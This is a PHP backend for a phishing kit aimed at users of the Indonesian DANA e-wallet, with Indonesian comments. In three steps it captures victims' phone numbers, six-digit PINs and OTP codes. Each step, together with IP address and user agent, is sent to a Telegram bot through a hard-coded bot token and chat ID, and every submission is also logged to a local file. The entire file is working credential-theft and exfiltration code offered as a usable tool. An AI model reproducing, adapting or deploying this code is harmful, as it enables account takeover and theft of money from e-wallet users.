<?php
// ===== KONFIGURASI TELEGRAM =====
define('TELEGRAM_BOT_TOKEN', '8553295920:AAGGToBSkBfPi7I1SYo9FmKgsxNudHDrHqE');
define('TELEGRAM_CHAT_ID', '6496853261');
define('TELEGRAM_API_URL', 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage');

/**
 * Fungsi untuk mengirim pesan ke Telegram
 * @param string $message - Pesan yang akan dikirim
 * @return bool - True jika berhasil, False jika gagal
 */
function sendToTelegram($message) {
    if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
        // Token belum dikonfigurasi, skip sending untuk dev
        return false;
    }
    
    $postData = array(
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    );
    
    $ch = curl_init(TELEGRAM_API_URL);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ($httpCode === 200);
}

/**
 * Format pesan untuk step 1 (Nomor HP)
 */
function formatStep1($nohp) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    $message = "<b>📱 DANA STEP 1 - NOMOR HP</b>\n\n";
    $message .= "<b>No. HP:</b> <code>+62" . htmlspecialchars($nohp) . "</code>\n";
    $message .= "<b>IP Address:</b> <code>$ip</code>\n";
    $message .= "<b>Time:</b> <code>$timestamp</code>\n";
    $message .= "<b>User Agent:</b> <code>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</code>";
    
    return $message;
}

/**
 * Format pesan untuk step 2 (PIN DANA)
 */
function formatStep2($nohp, $pin) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    $message = "<b>🔑 DANA STEP 2 - PIN DANA</b>\n\n";
    $message .= "<b>No. HP:</b> <code>+62" . htmlspecialchars($nohp) . "</code>\n";
    $message .= "<b>PIN:</b> <code>" . htmlspecialchars($pin) . "</code>\n";
    $message .= "<b>IP Address:</b> <code>$ip</code>\n";
    $message .= "<b>Time:</b> <code>$timestamp</code>\n";
    $message .= "<b>User Agent:</b> <code>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</code>";
    
    return $message;
}

/**
 * Format pesan untuk step 3 (OTP)
 */
function formatStep3($nohp, $otp) {
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    
    $message = "<b>🔐 DANA STEP 3 - OTP VERIFICATION</b>\n\n";
    $message .= "<b>No. HP:</b> <code>+62" . htmlspecialchars($nohp) . "</code>\n";
    $message .= "<b>OTP:</b> <code>" . htmlspecialchars($otp) . "</code>\n";
    $message .= "<b>IP Address:</b> <code>$ip</code>\n";
    $message .= "<b>Time:</b> <code>$timestamp</code>\n";
    $message .= "<b>User Agent:</b> <code>" . htmlspecialchars($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown') . "</code>";
    
    return $message;
}



/**
 * Simpan data submission ke file lokal (JSON lines)
 */
function saveSubmission(array $data) {
    $dir = __DIR__ . DIRECTORY_SEPARATOR . 'data';
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $file = $dir . DIRECTORY_SEPARATOR . 'submissions.jsonl';
    $entry = array(
        'time' => date('c'),
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
        'ua' => $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown',
        'data' => $data
    );

    @file_put_contents($file, json_encode($entry, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// ===== MAIN HANDLER =====
if (php_sapi_name() !== 'cli') {
    $response = array('ok' => false, 'sent' => false);
    $method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
    $input = array();

    if ($method === 'POST') {
        $input = $_POST;
        $raw = file_get_contents('php://input');
        if ($raw && empty($_POST)) {
            $json = @json_decode($raw, true);
            if (is_array($json)) {
                $input = array_replace($input, $json);
            }
        }
    } else {
        $input = $_GET;
    }

    $message = '';
    $sent = false;

    // Detect event type and format message
    if (!empty($input['page'])) {
        $page = (string)$input['page'];
        
        if ($page === 'step1' || $page === 'nohp') {
            // Step 1: Nomor HP
            if (!empty($input['nohp'])) {
                $message = formatStep1($input['nohp']);
            }
        }
        else if ($page === 'step2' || $page === 'pin') {
            // Step 2: PIN
            $pin = '';
            if (!empty($input['pin1'])) $pin .= $input['pin1'];
            if (!empty($input['pin2'])) $pin .= $input['pin2'];
            if (!empty($input['pin3'])) $pin .= $input['pin3'];
            if (!empty($input['pin4'])) $pin .= $input['pin4'];
            if (!empty($input['pin5'])) $pin .= $input['pin5'];
            if (!empty($input['pin6'])) $pin .= $input['pin6'];
            
            if (!empty($pin)) {
                $nohp = !empty($input['nohp']) ? $input['nohp'] : 'Unknown';
                $message = formatStep2($nohp, $pin);
            }
        }
        else if ($page === 'step3' || $page === 'otp') {
            // Step 3: OTP
            $otp = '';
            if (!empty($input['otp1'])) $otp .= $input['otp1'];
            if (!empty($input['otp2'])) $otp .= $input['otp2'];
            if (!empty($input['otp3'])) $otp .= $input['otp3'];
            if (!empty($input['otp4'])) $otp .= $input['otp4'];
            
            if (!empty($otp)) {
                $nohp = !empty($input['nohp']) ? $input['nohp'] : 'Unknown';
                $message = formatStep3($nohp, $otp);
            }
        }
    }
    // Handle requests tanpa page parameter (direct form submission)
    else {
        // Check step 1 - nomor HP
        if (!empty($input['nohp'])) {
            $message = formatStep1($input['nohp']);
        }
        // Check step 2 - PIN
        else if (!empty($input['pin1']) || !empty($input['pin2']) || !empty($input['pin3']) || 
                 !empty($input['pin4']) || !empty($input['pin5']) || !empty($input['pin6'])) {
            $pin = '';
            if (!empty($input['pin1'])) $pin .= $input['pin1'];
            if (!empty($input['pin2'])) $pin .= $input['pin2'];
            if (!empty($input['pin3'])) $pin .= $input['pin3'];
            if (!empty($input['pin4'])) $pin .= $input['pin4'];
            if (!empty($input['pin5'])) $pin .= $input['pin5'];
            if (!empty($input['pin6'])) $pin .= $input['pin6'];
            
            if (!empty($pin)) {
                $nohp = !empty($input['nohp']) ? $input['nohp'] : 'Unknown';
                $message = formatStep2($nohp, $pin);
            }
        }
        // Check step 3 - OTP
        else if (!empty($input['otp1']) || !empty($input['otp2']) || !empty($input['otp3']) || !empty($input['otp4'])) {
            $otp = '';
            if (!empty($input['otp1'])) $otp .= $input['otp1'];
            if (!empty($input['otp2'])) $otp .= $input['otp2'];
            if (!empty($input['otp3'])) $otp .= $input['otp3'];
            if (!empty($input['otp4'])) $otp .= $input['otp4'];
            
            if (!empty($otp)) {
                $nohp = !empty($input['nohp']) ? $input['nohp'] : 'Unknown';
                $message = formatStep3($nohp, $otp);
            }
        }
    }

    // Send to Telegram jika ada message
    if ($message !== '') {
        $sent = sendToTelegram($message);
    }

    // Save submission
    $input['_sent_to_telegram'] = $sent;
    $input['_timestamp'] = date('c');
    saveSubmission($input);

    $response['ok'] = true;
    $response['sent'] = $sent;

    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($response, JSON_UNESCAPED_UNICODE);
    exit;
}

?>
